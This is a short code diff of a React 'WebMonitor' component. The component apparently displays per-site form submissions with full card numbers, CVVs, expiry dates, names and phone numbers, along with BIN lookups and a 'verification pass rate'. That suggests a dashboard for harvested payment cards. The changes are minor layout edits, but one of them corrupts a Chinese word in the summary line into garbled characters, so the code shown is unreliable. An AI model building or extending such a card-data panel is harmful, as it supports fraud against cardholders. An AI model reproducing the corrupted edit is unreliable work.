@@ -276,7 +276,7 @@ export function WebMonitor() {
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
-              <div className="flex items-center justify-between mb-0.5">
+              <div className="flex items-center gap-2 mb-0.5">
                 <div className="flex items-center gap-1">
                   <div className="text-xs text-muted-foreground">💳</div>
                   {submission.binLookup ? (
@@ -363,7 +363,7 @@ export function WebMonitor() {
         {/* Bottom Summary */}
         <div className="mt-6 pt-4 border-t border-border">
           <div className="text-xs text-muted-foreground">
-            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
+            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验��通过率 82%
           </div>
         </div>
       </div>
